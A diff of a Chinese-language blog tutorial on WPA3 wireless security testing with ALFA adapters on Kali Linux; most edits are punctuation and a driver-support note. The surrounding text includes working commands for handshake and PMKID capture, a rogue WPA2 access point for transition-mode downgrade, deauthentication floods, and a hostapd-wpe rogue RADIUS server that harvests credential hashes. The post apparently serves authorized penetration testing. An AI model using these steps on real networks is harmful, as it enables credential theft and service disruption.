@@ -8,7 +8,7 @@ showTableOfContents: true
 tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
 featureimage: "/images/blog/wpa3-security-testing-alfa-2026.webp"
 author: "benny-lai"
-lastmod: 2026-07-02
+lastmod: 2026-11-20
 faq:
   - question: "WPA3 與 WPA2 在安全測試上有何不同？"
     answer: "WPA3 採用 SAE 握手取代 PSK，具備前向保密且無法離線字典攻擊。PMF 為強制要求，但轉換模式引入了降級攻擊面。"
@@ -66,7 +66,7 @@ WPA3-Enterprise 強制要求使用 GCMP-256 與 HMAC-SHA-384 的 192 位元安�
 
 WPA3 測試需要具備可靠監聽模式、封包注入支援，以及——針對 6 GHz WPA3 網路——三頻段能力的網路卡：
 
-- **AWUS036AXML** — Wi-Fi 6E (6 GHz) WPA3 網路的必要選擇。採用 Mediatek MT7921AUN 晶片組。在 Kali Linux 搭配 kernel 5.18+ 環境下，完整支援監聽模式與封包注入。這是唯一涵蓋 6 GHz 頻道的 ALFA 網路卡，而純 WPA3 部署在該頻段日益普遍。
+- **AWUS036AXML** — Wi-Fi 6E (6 GHz) WPA3 網路的必要選擇。採用 Mediatek MT7921AUN 晶片組。在 Kali Linux 搭配 kernel 5.18+ 環境下，監聽模式、AP 與 WPA3 可用；封包注入在 kernel 6.16 以前有社群回報可用，但 stock kernel 6.17 實測未通過（主因是 mac80211 chanctx 回歸，非晶片先天限制），需要注入請改用 AWUS036ACH。這是唯一涵蓋 6 GHz 頻道的 ALFA 網路卡，而純 WPA3 部署在該頻段日益普遍。
 - **AWUS036ACH** — 適用於 2.4/5 GHz WPA3 測試。採用 RTL8812AU 晶片組。與 aircrack-ng 工具鏈相容性最佳，跨 Kali Linux 版本的驅動程式支援最廣泛。
 
 ### 啟用監聽模式
@@ -109,14 +109,14 @@ sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
 sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon
 
 # 在 Wireshark 中分析擷取內容
-# 篩選器：wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
+# 篩選器: wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
 # (0x000b = Authentication 幀)
 wireshark -r sae_capture-01.cap
 ```
 
 在 Authentication 幀中，確認 SAE commit 與 confirm 交換。Beacon 幀中的 RSN Information Element 應顯示：
 - **AKM Suite**：WPA3-Personal 使用 00-0F-AC:8 (SAE)
-- **PMF**：Required（RSN Capabilities 中的 MFPR 位元已設置）
+- **PMF**：Required（RSN Capabilities 中的 MFPR 位元已設定）
 
 ### SAE 網路的 PMKID 測試
 
@@ -129,7 +129,7 @@ sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3
 # 轉換並檢查
 hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng
 
-# 空檔案或不存在的雜湊檔案，確認沒有 WPA2 PMKID 暴露
+# 空檔案或不存在的雜湊檔案, 確認沒有 WPA2 PMKID 暴露
 wc -l wpa3_hashes.hc22000
 ```
 
@@ -146,14 +146,14 @@ WPA3 轉換模式是當前企業環境中最具影響力的 WPA3 漏洞。當 AP
 ### 測試程序
 
 ```bash
-# 步驟一：確認目標處於轉換模式（airodump-ng 顯示 WPA2+WPA3）
+# 步驟一: 確認目標處於轉換模式 (airodump-ng 顯示 WPA2+WPA3)
 sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"
 
-# 步驟二：擷取合法 AP 的 beacon 幀，記錄其頻道與設定
+# 步驟二: 擷取合法 AP 的 beacon 幀, 記錄其頻道與設定
 sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon
 
-# 步驟三：使用 hostapd 在相同頻道建立純 WPA2 流氓 AP
-# 建立 /tmp/rogue_wpa2.conf：
+# 步驟三: 使用 hostapd 在相同頻道建立純 WPA2 流氓 AP
+# 建立 /tmp/rogue_wpa2.conf:
 cat > /tmp/rogue_wpa2.conf << 'EOF'
 interface=wlan1
 driver=nl80211
@@ -168,7 +168,7 @@ EOF
 
 sudo hostapd /tmp/rogue_wpa2.conf &
 
-# 步驟四：監控流氓 AP 上的用戶端關聯情況
+# 步驟四: 監控流氓 AP 上的用戶端關聯情況
 sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
 ```
 
@@ -210,7 +210,7 @@ sudo apt install hcxtools
 # 使用 hcxdumptool 觀察 SAE commit/confirm 幀交換的速率限制
 sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3
 
-# 在 Wireshark 中篩選 Authentication 幀並觀察：
+# 在 Wireshark 中篩選 Authentication 幀並觀察:
 # wlan.fc.type_subtype == 0x000b
 # 在 commit 幀中尋找 Anti-Clogging Token (ACT) 回應
 wireshark -r dragonblood_test.pcapng
@@ -247,11 +247,11 @@ AP 韌體版本是修補狀態的重要指標。將所發現的 AP 韌體版本�
 # 嘗試對透過 WPA3-SAE 關聯的測試用戶端進行去認證
 sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
 
-# 正確設定的 WPA3 網路預期結果：
-# - 測試用戶端不會斷線（受 PMF 保護的管理幀被丟棄）
+# 正確設定的 WPA3 網路預期結果:
+# - 測試用戶端不會斷線 (受 PMF 保護的管理幀被丟棄)
 # - airodump-ng 未顯示擷取到握手
 
-# 失敗條件（發現）：
+# 失敗條件 (發現):
 # - 測試用戶端斷線並重新關聯
 # - airodump-ng 擷取到新的握手
 ```
@@ -289,7 +289,7 @@ OWE（Wi-Fi Enhanced Open）是 WPA3 針對完全開放（未加密）訪客網�
 sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"
 
 # 與 OWE SSID 配對且無加密的隱藏 SSID 即為轉換 SSID
-# 支援 WPA3 的用戶端應優先選擇 OWE；舊式用戶端回退至開放模式
+# 支援 WPA3 的用戶端應優先選擇 OWE; 舊式用戶端回退至開放模式
 ```
 
 **發現：** 若支援 WPA3 的用戶端連接至開放轉換 SSID 而非 OWE SSID，表示該用戶端作業系統未能正確處理 OWE 轉換模式。該用戶端的所有流量均未加密。
@@ -323,7 +323,7 @@ WPA3-Enterprise 網路上出現 CCMP-128 為中級發現；表示 AP 未強制�
 # 使用 hostapd-wpe 部署帶有流氓 RADIUS 的流氓 AP
 sudo apt install hostapd-wpe
 
-# 編輯 /etc/hostapd-wpe/hostapd-wpe.conf，設定目標 SSID 與頻道
+# 編輯 /etc/hostapd-wpe/hostapd-wpe.conf, 設定目標 SSID 與頻道
 sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 
 # 監控擷取到的憑證雜湊值
